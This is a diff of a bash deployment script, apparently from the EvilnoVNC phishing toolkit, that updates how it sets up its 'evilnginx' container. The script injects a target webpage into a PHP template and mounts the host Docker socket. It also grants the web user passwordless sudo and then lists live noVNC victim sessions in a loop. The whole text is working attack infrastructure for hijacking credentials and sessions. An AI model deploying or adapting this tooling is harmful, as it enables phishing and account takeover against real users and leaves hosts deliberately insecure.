@@ -17,16 +17,16 @@ fi ; exit 0 ; fi
 WEBPAGE=$1
 
 path=$(pwd)
-echo "Preparando nginx..."
+printf "\n\e[1;33m[>]Preparando nginx..."
 cd Files
 cp index.php index_tmp.php
-id_image=$(sudo docker images | grep evilnovnc | cut -d" " -f 9)
+id_image=$(sudo docker images evilnovnc -q)
 sed -i'' -e "s,webpage,$WEBPAGE,g" index_tmp.php
-sed -i'' -e "s/idimage/$id_image/g" index_tmp.php
+sed -i'' -e "s,idimage,$id_image,g" index_tmp.php
 sed -i'' -e "s,download_string,$path/Downloads,g" index_tmp.php
 cd ..
 sudo docker network create nginx-evil 2> /dev/null
-sudo docker run --name evilnginx  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:8080 -d nginx
+sudo docker run --name evilnginx  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:8080 -d nginx:1.23.2
 sudo docker exec -it evilnginx bash -c "apt update && apt install apache2 php7.4 sudo -y"
 sudo docker exec -it evilnginx bash -c "curl -fsSL https://get.docker.com | sh"
 sudo docker exec -it evilnginx bash -c "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
@@ -38,4 +38,12 @@ sudo docker exec -it evilnginx bash -c "service apache2 start"
 sudo docker exec -it evilnginx bash -c "cp /data/index.html /usr/share/nginx/html/index.html"
 sudo docker exec -it evilnginx bash -c "cp /data/index_tmp.php /var/www/html/index.php"
 rm ./Files/index_tmp.php
-echo "Fin nginx..."
+printf "\n\e[1;33m[>]Fin nginx..."
+
+
+trap 'printf "\n\e[1;33m[>] Wait a moment..." ; sleep 3
+sudo docker stop evilnginx > /dev/null 2>&1 &
+sudo docker network rm nginx-evil > /dev/null 2>&1 &
+printf "\n\e[1;32m[+] Done!\n\e[1;0m"' SIGTERM EXIT
+
+while true ; do clear; instances=$(sudo docker  ps | grep 5980 | awk -F"tcp" '{print $2}' | tr -d " "); for ins in $(echo $instances); do echo "http://localhost/$ins";sleep 15; done ; done
